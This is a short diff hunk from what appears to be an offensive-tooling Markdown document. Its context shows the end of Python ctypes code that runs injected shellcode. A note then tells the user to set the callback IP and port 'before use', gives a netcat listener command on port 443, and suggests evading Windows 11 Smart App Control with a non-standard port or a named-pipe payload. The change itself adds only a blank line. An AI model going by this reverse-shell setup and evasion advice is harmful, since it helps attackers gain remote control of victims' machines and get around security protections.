@@ -483,3 +483,4 @@ ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
 > **Note:** Update IP (`0x31061fac`) and port (`0xbb01`) before use. Listener: `nc -nvlp 443`
 >
 > **Windows 11 23H2:** Smart App Control may block outbound TCP 443/4444 to local subnets. Use a non-standard port or a named-pipe payload.
+
